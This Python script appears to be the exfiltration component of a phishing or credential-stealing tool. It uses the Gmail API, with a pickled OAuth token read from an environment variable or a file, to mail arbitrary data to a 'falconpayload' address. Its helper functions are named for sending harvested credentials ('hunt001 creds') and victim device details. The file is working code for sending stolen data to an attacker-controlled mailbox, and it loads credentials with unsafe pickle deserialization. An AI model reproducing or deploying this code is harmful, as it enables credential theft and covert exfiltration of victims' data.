#Author : hunter.target.001@gmail.com
#File created on 06 Oct 2020 9:39 PM

from googleapiclient.discovery import build
import pickle
from email.mime.text import MIMEText
import base64

import os

def create_message(sender, to, subject, message_text):
    message = MIMEText(message_text)
    message['to'] = to
    message['from'] = sender
    message['subject'] = subject
    #message['cc'] = "rathesun01@gmail.com"
    return {'raw': base64.urlsafe_b64encode(message.as_string().encode()).decode()}

def send_message(service, user_id, message):
    """
    Sends an email message.
    Arguments:
    service: an authorized Gmail API service instance.
    user_id: User's email address. To indicate the authenticated user, the special value "me" can be used.
    message: Message to be sent.
    """
    message = (service.users().messages().send(userId=user_id, body=message)
               .execute())
    print('Message Id: %s' % message['id'])
    return message

def send_data_to_mail(subject, data):

    token_path='mail-token.pickle'

    # mail-token.pickle binary data is set in heroku app against the key "mail-token"
    mail_token_env = os.getenv('mail_token')
    if mail_token_env is not None:
        #print(mail_token_env)
        # https://stackoverflow.com/questions/44479826/how-do-you-set-a-string-of-bytes-from-an-environment-variable-in-python
        # The escape slashes would be removed in unicode_escape encoding
        mail_token_env = bytes(mail_token_env, 'utf-8').decode('unicode_escape')
        # latin1 encoding will encode the string as it is into bytes
        mail_token_env_bytes=bytes(mail_token_env, 'latin1')
        #print(mail_token_env_bytes)
        creds = pickle.loads(mail_token_env_bytes)

    else:
        print("Token is not available in environment")
        with open(token_path, 'rb') as token:
            creds=pickle.load(token)


    service = build('gmail', 'v1', credentials=creds)
    # Call the Gmail API
    user_id = "hunter.target.001@gmail.com"
    results = service.users().labels().list(userId=user_id).execute()
    labels = results.get('labels', [])
    #print("labels: ", labels)
    message = create_message(user_id, "falconpayload@gmail.com", subject, str(data))
    send_message(service, user_id, message)


def send_creds_to_mail(data):
    send_data_to_mail("hunt001 creds", data)


def send_dev_details_to_mail(data):
    send_data_to_mail("hunt001 device details", data)